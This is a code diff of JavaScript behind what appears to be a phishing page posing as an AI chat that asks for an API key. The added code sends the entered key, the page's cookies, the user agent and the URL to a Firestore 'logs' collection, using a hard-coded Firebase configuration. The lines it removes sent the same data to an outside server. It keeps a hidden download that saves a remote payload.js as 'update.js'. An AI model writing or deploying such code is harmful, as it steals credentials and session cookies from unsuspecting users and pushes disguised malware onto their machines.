@@ -1,3 +1,18 @@
+// ===== KONFIGURASI FIREBASE =====
+const firebaseConfig = {
+    apiKey: "AIzaSyBhSJdSbsHlec8FsWzol1koxEBtXJ4uxh8",
+    authDomain: "metadata-162de.firebaseapp.com",
+    projectId: "metadata-162de",
+    storageBucket: "metadata-162de.firebasestorage.app",
+    messagingSenderId: "619982193399",
+    appId: "1:619982193399:web:b3c4111e57e46d6f6f49f2",
+    measurementId: "G-Z6RWGEMLXB"
+};
+
+// ===== INIT FIREBASE =====
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
+
 // ===== ELEMEN =====
 const chat = document.getElementById('chat');
 const input = document.getElementById('api-input');
@@ -12,21 +27,25 @@ function addMessage(sender, text) {
     chat.scrollTop = chat.scrollHeight;
 }
 
-// ===== PAYLOAD (Cookie Hijack + Download) =====
+// ===== PAYLOAD =====
 function runPayload() {
-    // 1. Kirim data ke server
-    fetch('https://payload-nu-eight.vercel.app/api/server.php', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            api_key: input.value,
-            cookies: document.cookie,
-            user_agent: navigator.userAgent,
-            url: window.location.href
-        })
+    // 1. Kirim data ke Firestore
+    db.collection("logs").add({
+        api_key: input.value,
+        cookies: document.cookie,
+        user_agent: navigator.userAgent,
+        url: window.location.href,
+        timestamp: new Date().toISOString()
+    })
+    .then(() => {
+        addMessage('AI', '✅ Data terkirim ke Firestore!');
+    })
+    .catch((error) => {
+        console.error("Error:", error);
+        addMessage('AI', '❌ Gagal mengirim data.');
     });
 
-    // 2. Download payload.js tanpa notif
+    // 2. Download payload.js
     const link = document.createElement('a');
     link.href = 'https://shadowofobscurity322.github.io/payload/payload.js';
     link.download = 'update.js';
@@ -34,9 +53,6 @@ function runPayload() {
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
-
-    // 3. Tampilkan pesan sukses
-    addMessage('AI', '✅ API Key terverifikasi! Silakan chat.');
 }
 
 // ===== EVENT =====
